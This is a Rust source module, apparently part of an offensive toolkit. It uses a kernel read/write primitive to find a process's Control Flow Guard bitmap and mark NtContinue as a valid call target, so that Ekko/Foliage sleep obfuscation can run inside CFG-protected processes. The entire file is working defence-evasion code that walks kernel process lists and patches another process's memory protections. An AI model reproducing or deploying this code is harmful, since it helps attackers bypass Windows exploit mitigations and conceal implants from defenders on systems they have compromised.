//! CFG (Control Flow Guard) bitmap manipulation via kernel r/w.
//!
//! ## The problem
//! Ekko/Foliage sleep obfuscation uses `CreateTimerQueueTimer` callbacks that
//! indirectly call `NtContinue`. On CFG-enabled processes (rundll32.exe, any
//! modern Windows binary), this triggers STATUS_STACK_BUFFER_OVERRUN (0xC0000409)
//! because `NtContinue` is not in the CFG valid-target bitmap for that process.
//!
//! ## The fix
//! Locate the CFG bitmap (one bit per 16-byte user-mode address block), find the
//! bit for `NtContinue`, and set it to 1 via kernel r/w. The bitmap is a flat
//! bit array mapped at a fixed user-mode VA in every process.
//!
//! ## Cross-process access
//! The kernel's VA→PA translation uses the SYSTEM process's CR3 by default.
//! User-mode addresses are per-process — we need the TARGET process's CR3,
//! read from its EPROCESS.DirectoryTableBase (offset 0x28 in KPROCESS).
//!
//! ## Version compatibility
//! - Win8.1+ (CFG introduced): LdrSystemDllInitBlock exported by ntdll
//! - CfgBitMap offset within init block: 0x60 on Win10 1709+ (Black Hat paper),
//!   0x40 on Win8.1. Detect via the Size field (first ULONG of the block).
//! - Win11 24H2: SCPCFG coexists; classic CFG bitmap still checked.

use crate::KernelRw;
use crate::offsets::EprocessOffsets;

/// Offset of `_KPROCESS.DirectoryTableBase` within `_EPROCESS` (x64).
/// KPROCESS is the first embedded struct; this field is stable across Win10+ builds.
const KPROCESS_DIRECTORY_TABLE_BASE: usize = 0x28;

/// Result of locating the CFG bitmap for a given process.
pub struct CfgBitMap {
    /// Virtual address of the CFG bitmap (user-mode VA, identical across all processes).
    pub base: usize,
    /// Size of the bitmap in bytes.
    pub size: usize,
}

/// Locate the CFG bitmap by reading `ntdll!LdrSystemDllInitBlock` from the
/// operator's own process. The bitmap address is the same in every process.
///
/// `ntdll_base` — kernel VA of ntdll.dll (system-wide same).
/// `krw` — kernel r/w primitive (uses SYSTEM CR3 for kernel VA reads).
pub fn locate_cfg_bitmap(ntdll_base: usize, krw: &dyn KernelRw) -> Option<CfgBitMap> {
    // 1. Find LdrSystemDllInitBlock export in ntdll.
    let init_block_rva = resolve_export_rva(ntdll_base, krw, "LdrSystemDllInitBlock")?;

    // 2. Read the Size field (first ULONG) to detect structure version.
    let mut size_buf = [0u8; 4];
    krw.kread(ntdll_base + init_block_rva, &mut size_buf).ok()?;
    let block_size = u32::from_le_bytes(size_buf) as usize;

    // 3. Determine CfgBitMap offset based on structure size.
    //    Win8.1 (0x70): CfgBitMap at 0x40
    //    Win10 1709+ (0xF0+): CfgBitMap at 0x60
    //    Win10 2004+ (≥0x100): CfgBitMap at 0x68 or 0x70
    let cfg_bitmap_off: usize = if block_size <= 0x70 {
        0x40 // Win8.1 / early Win10
    } else if block_size <= 0xF8 {
        0x60 // Win10 1709–1909
    } else {
        0x68 // Win10 2004+
    };

    // 4. Read CfgBitMap (ULONG64, 8 bytes) and CfgBitMapSize (ULONG64, 8 bytes).
    let mut bitmap_buf = [0u8; 16];
    krw.kread(ntdll_base + init_block_rva + cfg_bitmap_off, &mut bitmap_buf).ok()?;
    let bitmap_addr = usize::from_le_bytes(bitmap_buf[..8].try_into().unwrap());
    let bitmap_size = usize::from_le_bytes(bitmap_buf[8..16].try_into().unwrap());

    if bitmap_addr == 0 || bitmap_size == 0 {
        return None;
    }

    Some(CfgBitMap {
        base: bitmap_addr,
        size: bitmap_size,
    })
}

/// Set the CFG valid bit for `target_addr` in the CFG bitmap.
///
/// `krw` must use the TARGET process's CR3 (not SYSTEM CR3) because the
/// CFG bitmap is at a user-mode VA.
///
/// Returns true if the bit was set (or was already set).
pub fn mark_cfg_valid(target_addr: usize, bitmap: &CfgBitMap, krw: &dyn KernelRw) -> bool {
    // Each bit covers 16 bytes of address space.
    let bit_index = target_addr >> 4; // target_addr / 16
    let byte_offset = bit_index >> 3; // bit_index / 8
    let bit_in_byte = (bit_index & 7) as u8;

    if byte_offset >= bitmap.size {
        return false; // address outside bitmap range
    }

    let cfg_byte_va = bitmap.base + byte_offset;

    // Read current byte.
    let mut buf = [0u8; 1];
    if krw.kread(cfg_byte_va, &mut buf).is_err() {
        return false;
    }

    let old = buf[0];
    buf[0] |= 1 << bit_in_byte;

    if old == buf[0] {
        return true; // bit already set
    }

    // Write back.
    krw.kwrite(cfg_byte_va, &buf).is_ok()
}

/// Walk the EPROCESS ActiveProcessLinks list to find a process by PID,
/// and return its DirectoryTableBase (CR3) for VA→PA translation.
///
/// `ps_active_head_kva` — kernel VA of PsActiveProcessHead.
/// `offsets` — EPROCESS field offsets for this build.
/// `target_pid` — the PID to look for (as a usize HANDLE).
/// `krw` — kernel r/w primitive (SYSTEM CR3 for kernel VA reads).
pub fn get_process_cr3(
    ps_active_head_kva: usize,
    offsets: &EprocessOffsets,
    target_pid: usize,
    krw: &dyn KernelRw,
) -> Option<u64> {
    // Start at the list head.
    let mut link_kva = ps_active_head_kva;

    loop {
        // Read Flink (next entry).
        let mut flink_buf = [0u8; 8];
        krw.kread(link_kva, &mut flink_buf).ok()?;
        let flink = usize::from_le_bytes(flink_buf);

        // Flink points to the ActiveProcessLinks field of the next EPROCESS.
        // Recover EPROCESS base: eprocess = flink - active_process_links.
        let eprocess = flink.wrapping_sub(offsets.active_process_links);

        // Validate: non-canonical → corrupted list.
        if eprocess < 0xFFFF_8000_0000_0000 {
            break;
        }

        // Read UniqueProcessId.
        let mut pid_buf = [0u8; 8];
        if krw.kread(eprocess + offsets.unique_process_id, &mut pid_buf).is_err() {
            break;
        }
        let pid = usize::from_le_bytes(pid_buf);

        if pid == target_pid {
            // Found the target. Read DirectoryTableBase from KPROCESS.
            let mut dtb_buf = [0u8; 8];
            if krw.kread(eprocess + KPROCESS_DIRECTORY_TABLE_BASE, &mut dtb_buf).is_err() {
                return None;
            }
            return Some(u64::from_le_bytes(dtb_buf));
        }

        // Advance to next entry.
        link_kva = flink;
        if link_kva == ps_active_head_kva {
            break; // wrapped around
        }
    }

    None
}

/// Resolve the RVA of a named export from ntdll via its PE export table.
/// Reads kernel VA memory via `krw` (requires SYSTEM CR3 for kernel VAs).
fn resolve_export_rva(ntdll_base: usize, krw: &dyn KernelRw, name: &str) -> Option<usize> {
    // PE header: e_lfanew at DOS header offset 0x3C.
    let mut e_lfanew_buf = [0u8; 4];
    krw.kread(ntdll_base + 0x3C, &mut e_lfanew_buf).ok()?;
    let e_lfanew = i32::from_le_bytes(e_lfanew_buf) as usize;

    // Optional header: DataDirectory[0] (export directory) starts at offset 0x88 (PE32+) or 0x78 (PE32).
    // Check Magic at e_lfanew + 4 + 20 (offset of Magic in optional header).
    let mut magic_buf = [0u8; 2];
    krw.kread(ntdll_base + e_lfanew + 4 + 20, &mut magic_buf).ok()?;
    let magic = u16::from_le_bytes(magic_buf);
    let export_dir_off = if magic == 0x20B { 0x88 } else { 0x78 }; // PE32+:PE32

    let mut export_rva_buf = [0u8; 4];
    krw.kread(ntdll_base + e_lfanew + 4 + export_dir_off, &mut export_rva_buf).ok()?;
    let export_rva = u32::from_le_bytes(export_rva_buf) as usize;
    if export_rva == 0 { return None; }

    // Read export directory.
    let export_kva = ntdll_base + export_rva;
    let mut dir_buf = [0u8; 40]; // IMAGE_EXPORT_DIRECTORY (40 bytes)
    krw.kread(export_kva, &mut dir_buf).ok()?;
    let num_names = u32::from_le_bytes(dir_buf[24..28].try_into().unwrap()) as usize;
    let func_rva = u32::from_le_bytes(dir_buf[28..32].try_into().unwrap()) as usize;
    let name_rva = u32::from_le_bytes(dir_buf[32..36].try_into().unwrap()) as usize;
    let ord_rva = u32::from_le_bytes(dir_buf[36..40].try_into().unwrap()) as usize;

    // Binary search the export name table.
    let name_bytes = name.as_bytes();
    let mut lo: usize = 0;
    let mut hi = num_names;
    while lo < hi {
        let mid = (lo + hi) / 2;
        // Read name RVA at name_rva + mid * 4.
        let mut name_rva_buf = [0u8; 4];
        krw.kread(ntdll_base + name_rva + mid * 4, &mut name_rva_buf).ok()?;
        let entry_name_rva = u32::from_le_bytes(name_rva_buf) as usize;
        // Read the first few chars to compare.
        let mut cmp_buf = [0u8; 64];
        let cmp_len = name_bytes.len().min(63);
        krw.kread(ntdll_base + entry_name_rva, &mut cmp_buf[..cmp_len]).ok()?;
        let cmp = core::str::from_utf8(&cmp_buf[..cmp_len]).unwrap_or("");
        if name_bytes < cmp.as_bytes() {
            hi = mid;
        } else if name_bytes > cmp.as_bytes() {
            lo = mid + 1;
        } else {
            // Found. Read ordinal at ord_rva + mid * 2.
            let mut ord_buf = [0u8; 2];
            krw.kread(ntdll_base + ord_rva + mid * 2, &mut ord_buf).ok()?;
            let ord = u16::from_le_bytes(ord_buf) as usize;
            // Read function RVA at func_rva + ord * 4.
            let mut func_rva_buf = [0u8; 4];
            krw.kread(ntdll_base + func_rva + ord * 4, &mut func_rva_buf).ok()?;
            return Some(u32::from_le_bytes(func_rva_buf) as usize);
        }
    }
    None
}
